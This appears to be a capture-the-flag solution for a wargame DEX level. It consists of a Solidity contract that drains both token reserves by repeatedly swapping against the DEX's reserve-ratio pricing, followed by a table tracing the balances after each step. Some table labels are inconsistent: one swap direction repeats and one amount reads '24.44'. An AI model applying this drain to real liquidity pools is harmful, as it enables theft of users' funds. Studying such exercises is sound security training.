```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexSolution {
    event Swapped(address from, address to, uint256 amount);

    /**
     * Step 1: approve the contract to spend player tokens
     *         `await contract.approve('0x7d39DbaFF518FFbB2cddD536dA5E91347fC43591', toWei('10'))`
     * Step 2: invoke the "drain" function
     */
    function drain(address _dex, address _player) external {
        IDex dex = IDex(_dex);
        (address token1, address token2) = (dex.token1(), dex.token2());
        IERC20(token1).transferFrom(_player, address(this), dex.balanceOf(token1, _player));
        IERC20(token2).transferFrom(_player, address(this), dex.balanceOf(token2, _player));

        dex.approve(_dex, dex.balanceOf(token1, _dex)); // dex.balanceOf(token1, _dex) == dex.balanceOf(token2, _dex)

        while (dex.balanceOf(token1, _dex) > 0 && dex.balanceOf(token2, _dex) > 0) {
            uint256 amount = dex.balanceOf(token1, address(this));
            if (dex.getSwapPrice(token1, token2, amount) > dex.balanceOf(token2, _dex)) {
                amount = dex.balanceOf(token1, _dex);
            }
            dex.swap(token1, token2, amount);
            emit Swapped(token1, token2, amount);
            (token1, token2) = (token2, token1);
        }

        IERC20(token1).transfer(_player, dex.balanceOf(token1, address(this)));
        IERC20(token2).transfer(_player, dex.balanceOf(token2, address(this)));
    }
}
```

## Fund Flow

```
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  100    |  100    |
    | Player  |  10     |  10     |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t1, to=t2, amount=10) = (10 * 100) / 100 = 10
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  110    |  90     |
    | Player  |  0      |  20     |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t2, to=t1, amount=20) = (20 * 110) / 90 = 24
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  86     |  110    |
    | Player  |  24     |  0      |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t1, to=t2, amount=24.44) = (24 * 110) / 86 = 30
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  110    |  80     |
    | Player  |  0      |  30     |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t2, to=t1, amount=30) = (30 * 110) / 80 = 41
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  69     |  110    |
    | Player  |  41     |  0      |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t2, to=t1, amount=41) = (41 * 110) / 69 = 65
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  110    |  45     |
    | Player  |  0      |  65     |
    -------------------------------
                  |                 swapAmount = getSwapPrice(from=t2, to=t1, amount=45) = (45 * 110) / 45 = 110
                  |
                  ᐁ
    -------------------------------
    |         |  Token1 |  Token2 |
    |---------|---------|---------|
    | Dex     |  0      |  90     |
    | Player  |  110    |  20     |
    -------------------------------
```
